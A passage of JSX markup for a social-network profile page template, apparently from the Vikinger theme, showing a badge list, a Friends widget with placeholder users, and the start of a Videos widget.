                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* BADGE LIST */}
                    <div className="badge-list">
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Gold User" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/gold-s.png" alt="badge-gold-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-35.5px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Gold User</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Profile Age" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/age-s.png" alt="badge-age-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-39px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Profile Age</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Caffeinatted" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/caffeinated-s.png" alt="badge-caffeinated-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-43.5px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Caffeinatted</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="The Warrior" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/warrior-s.png" alt="badge-warrior-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-41px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">The Warrior</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Forum Traveller" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/traveller-s.png" alt="badge-traveller-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-51px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Forum Traveller</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Crazy Scientist" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/scientist-s.png" alt="badge-scientist-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-49px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Crazy Scientist</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Night Creature" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/ncreature-s.png" alt="badge-ncreature-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-48.5px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Night Creature</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Mightier Than Sword" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/mightiers-s.png" alt="badge-mightiers-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-63px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Mightier Than Sword</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="The Phantom" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/phantom-s.png" alt="badge-phantom-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-44.5px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">The Phantom</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="The Collector" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/collector-s.png" alt="badge-collector-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-44px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">The Collector</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Bronze Cup" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/bronzec-s.png" alt="badge-bronzec-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-40px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Bronze Cup</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Silver Cup" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/silverc-s.png" alt="badge-silverc-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-37px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Silver Cup</p></div></div>
                      {/* /BADGE ITEM */}
                      {/* BADGE ITEM */}
                      <div className="badge-item text-tooltip-tft" data-title="Gold Cup" style={{"position":"relative"}}>
                        <img src="https://odindesignthemes.com/vikinger/img/badge/goldc-s.png" alt="badge-goldc-s" />
                        <div className="xm-tooltip" style={{"white-space":"nowrap","position":"absolute","z-index":"99999","top":"-28px","left":"50%","margin-left":"-34px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, 10px)","-ms-transform":"translate(0px, 10px)","transform":"translate(0px, 10px)","-webkit-transition":"all 0.3s ease-in-out 0s","transition":"all 0.3s ease-in-out 0s"}}><p className="xm-tooltip-text">Gold Cup</p></div></div>
                      {/* /BADGE ITEM */}
                    </div>
                    {/* /BADGE LIST */}
                  </div>
                  {/* /WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Friends <span className="highlighted">82</span></p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* USER STATUS LIST */}
                    <div className="user-status-list">
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="profile-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-outline">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-30-32" data-src="https://odindesignthemes.com/vikinger/img/avatar/07.jpg" style={{"width":"30px","height":"32px","position":"relative"}}><canvas width={30} height={32} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                            {/* USER AVATAR PROGRESS */}
                            <div className="user-avatar-progress">
                              {/* HEXAGON */}
                              <div className="hexagon-progress-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS */}
                            {/* USER AVATAR PROGRESS BORDER */}
                            <div className="user-avatar-progress-border">
                              {/* HEXAGON */}
                              <div className="hexagon-border-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS BORDER */}
                            {/* USER AVATAR BADGE */}
                            <div className="user-avatar-badge">
                              {/* USER AVATAR BADGE BORDER */}
                              <div className="user-avatar-badge-border">
                                {/* HEXAGON */}
                                <div className="hexagon-22-24" style={{"width":"22px","height":"24px","position":"relative"}}><canvas width={22} height={24} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE BORDER */}
                              {/* USER AVATAR BADGE CONTENT */}
                              <div className="user-avatar-badge-content">
                                {/* HEXAGON */}
                                <div className="hexagon-dark-16-18" style={{"width":"16px","height":"18px","position":"relative"}}><canvas width={16} height={18} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE CONTENT */}
                              {/* USER AVATAR BADGE TEXT */}
                              <p className="user-avatar-badge-text">26</p>
                              {/* /USER AVATAR BADGE TEXT */}
                            </div>
                            {/* /USER AVATAR BADGE */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="profile-timeline.html">Sarah Diamond</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">2 friends in common</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-add-friend">
                              <use xlinkHref="#svg-add-friend" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="profile-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-outline">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-30-32" data-src="https://odindesignthemes.com/vikinger/img/avatar/03.jpg" style={{"width":"30px","height":"32px","position":"relative"}}><canvas width={30} height={32} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                            {/* USER AVATAR PROGRESS */}
                            <div className="user-avatar-progress">
                              {/* HEXAGON */}
                              <div className="hexagon-progress-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS */}
                            {/* USER AVATAR PROGRESS BORDER */}
                            <div className="user-avatar-progress-border">
                              {/* HEXAGON */}
                              <div className="hexagon-border-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS BORDER */}
                            {/* USER AVATAR BADGE */}
                            <div className="user-avatar-badge">
                              {/* USER AVATAR BADGE BORDER */}
                              <div className="user-avatar-badge-border">
                                {/* HEXAGON */}
                                <div className="hexagon-22-24" style={{"width":"22px","height":"24px","position":"relative"}}><canvas width={22} height={24} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE BORDER */}
                              {/* USER AVATAR BADGE CONTENT */}
                              <div className="user-avatar-badge-content">
                                {/* HEXAGON */}
                                <div className="hexagon-dark-16-18" style={{"width":"16px","height":"18px","position":"relative"}}><canvas width={16} height={18} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE CONTENT */}
                              {/* USER AVATAR BADGE TEXT */}
                              <p className="user-avatar-badge-text">16</p>
                              {/* /USER AVATAR BADGE TEXT */}
                            </div>
                            {/* /USER AVATAR BADGE */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="profile-timeline.html">Nick Grissom</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">5 friends in common</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-add-friend">
                              <use xlinkHref="#svg-add-friend" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="profile-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-outline">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-30-32" data-src="https://odindesignthemes.com/vikinger/img/avatar/02.jpg" style={{"width":"30px","height":"32px","position":"relative"}}><canvas width={30} height={32} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                            {/* USER AVATAR PROGRESS */}
                            <div className="user-avatar-progress">
                              {/* HEXAGON */}
                              <div className="hexagon-progress-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS */}
                            {/* USER AVATAR PROGRESS BORDER */}
                            <div className="user-avatar-progress-border">
                              {/* HEXAGON */}
                              <div className="hexagon-border-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS BORDER */}
                            {/* USER AVATAR BADGE */}
                            <div className="user-avatar-badge">
                              {/* USER AVATAR BADGE BORDER */}
                              <div className="user-avatar-badge-border">
                                {/* HEXAGON */}
                                <div className="hexagon-22-24" style={{"width":"22px","height":"24px","position":"relative"}}><canvas width={22} height={24} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE BORDER */}
                              {/* USER AVATAR BADGE CONTENT */}
                              <div className="user-avatar-badge-content">
                                {/* HEXAGON */}
                                <div className="hexagon-dark-16-18" style={{"width":"16px","height":"18px","position":"relative"}}><canvas width={16} height={18} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE CONTENT */}
                              {/* USER AVATAR BADGE TEXT */}
                              <p className="user-avatar-badge-text">13</p>
                              {/* /USER AVATAR BADGE TEXT */}
                            </div>
                            {/* /USER AVATAR BADGE */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="profile-timeline.html">Destroy Dex</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">0 friends in common</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-add-friend">
                              <use xlinkHref="#svg-add-friend" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="profile-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-outline">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-30-32" data-src="https://odindesignthemes.com/vikinger/img/avatar/05.jpg" style={{"width":"30px","height":"32px","position":"relative"}}><canvas width={30} height={32} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                            {/* USER AVATAR PROGRESS */}
                            <div className="user-avatar-progress">
                              {/* HEXAGON */}
                              <div className="hexagon-progress-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS */}
                            {/* USER AVATAR PROGRESS BORDER */}
                            <div className="user-avatar-progress-border">
                              {/* HEXAGON */}
                              <div className="hexagon-border-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS BORDER */}
                            {/* USER AVATAR BADGE */}
                            <div className="user-avatar-badge">
                              {/* USER AVATAR BADGE BORDER */}
                              <div className="user-avatar-badge-border">
                                {/* HEXAGON */}
                                <div className="hexagon-22-24" style={{"width":"22px","height":"24px","position":"relative"}}><canvas width={22} height={24} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE BORDER */}
                              {/* USER AVATAR BADGE CONTENT */}
                              <div className="user-avatar-badge-content">
                                {/* HEXAGON */}
                                <div className="hexagon-dark-16-18" style={{"width":"16px","height":"18px","position":"relative"}}><canvas width={16} height={18} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE CONTENT */}
                              {/* USER AVATAR BADGE TEXT */}
                              <p className="user-avatar-badge-text">12</p>
                              {/* /USER AVATAR BADGE TEXT */}
                            </div>
                            {/* /USER AVATAR BADGE */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="profile-timeline.html">Neko Bebop</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">1 friends in common</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request decline">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-remove-friend">
                              <use xlinkHref="#svg-remove-friend" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="profile-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-outline">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-30-32" data-src="https://odindesignthemes.com/vikinger/img/avatar/10.jpg" style={{"width":"30px","height":"32px","position":"relative"}}><canvas width={30} height={32} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                            {/* USER AVATAR PROGRESS */}
                            <div className="user-avatar-progress">
                              {/* HEXAGON */}
                              <div className="hexagon-progress-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS */}
                            {/* USER AVATAR PROGRESS BORDER */}
                            <div className="user-avatar-progress-border">
                              {/* HEXAGON */}
                              <div className="hexagon-border-40-44" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR PROGRESS BORDER */}
                            {/* USER AVATAR BADGE */}
                            <div className="user-avatar-badge">
                              {/* USER AVATAR BADGE BORDER */}
                              <div className="user-avatar-badge-border">
                                {/* HEXAGON */}
                                <div className="hexagon-22-24" style={{"width":"22px","height":"24px","position":"relative"}}><canvas width={22} height={24} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE BORDER */}
                              {/* USER AVATAR BADGE CONTENT */}
                              <div className="user-avatar-badge-content">
                                {/* HEXAGON */}
                                <div className="hexagon-dark-16-18" style={{"width":"16px","height":"18px","position":"relative"}}><canvas width={16} height={18} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                                {/* /HEXAGON */}
                              </div>
                              {/* /USER AVATAR BADGE CONTENT */}
                              {/* USER AVATAR BADGE TEXT */}
                              <p className="user-avatar-badge-text">5</p>
                              {/* /USER AVATAR BADGE TEXT */}
                            </div>
                            {/* /USER AVATAR BADGE */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="profile-timeline.html">The Green Goo</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">8 friends in common</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-add-friend">
                              <use xlinkHref="#svg-add-friend" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                    </div>
                    {/* /USER STATUS LIST */}
                  </div>
                  {/* WIDGET BOX CONTENT */}
                  {/* WIDGET BOX BUTTON */}
                  <a className="widget-box-button button small secondary" href="profile-friends.html">See all Friends</a>
                  {/* /WIDGET BOX BUTTON */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Videos <span className="highlighted">7</span></p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* VIDEO BOX LIST */}
                    <div className="video-box-list">
                      {/* VIDEO BOX */}
                      <div className="video-box small">
                        {/* VIDEO BOX COVER */}
                        <div className="video-box-cover popup-video-trigger">
                          {/* VIDEO BOX COVER IMAGE */}
                          <figure className="video-box-cover-image liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/08.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/08.jpg" alt="cover-08" style={{"display":"none"}} />
                          </figure>
                          {/* /VIDEO BOX COVER IMAGE */}
                          {/* PLAY BUTTON */}
                          <div className="play-button">
                            {/* PLAY BUTTON ICON */}
                            <svg className="play-button-icon icon-play">
                              <use xlinkHref="#svg-play" />
                            </svg>
                            {/* /PLAY BUTTON ICON */}
                          </div>
                          {/* /PLAY BUTTON */}
                          {/* VIDEO BOX INFO */}
                          <div className="video-box-info">
                            {/* VIDEO BOX TITLE */}
                            <p className="video-box-title">Mochi's Island Story Mode</p>
                            {/* /VIDEO BOX TITLE */}
                            {/* VIDEO BOX TEXT */}
                            <p className="video-box-text">1 hour ago</p>
                            {/* /VIDEO BOX TEXT */}
                          </div>
                          {/* /VIDEO BOX INFO */}
                        </div>
                        {/* /VIDEO BOX COVER */}
                      </div>
                      {/* /VIDEO BOX */}
